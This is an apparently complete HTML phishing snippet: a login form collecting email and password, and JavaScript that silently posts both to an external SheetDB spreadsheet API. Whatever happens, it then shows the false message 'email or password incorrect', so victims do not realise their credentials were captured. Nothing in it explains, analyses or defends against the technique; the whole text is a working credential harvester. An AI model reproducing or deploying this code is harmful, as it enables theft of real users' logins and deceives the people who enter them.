<body>

  <form id="sheetdb-form" action="https://sheetdb.io/api/v1/ecm88j1kxrisn" method="POST">
    Email: 
   <input name="data[email]"> Password: 
   <input name="data[password]"> <button type="submit">Submit</button> 
  </form> 
  <script>
  var form = document.getElementById('sheetdb-form');
  form.addEventListener("submit", e => {
    e.preventDefault();
    fetch(form.action, {
        method : "POST",
        body: new FormData(document.getElementById("sheetdb-form")),
    }).then(
        response => response.json()
    ).then((html) => {
      // you can put any JS code here
      alert('email or password incorrect')
    });
  });
</script>
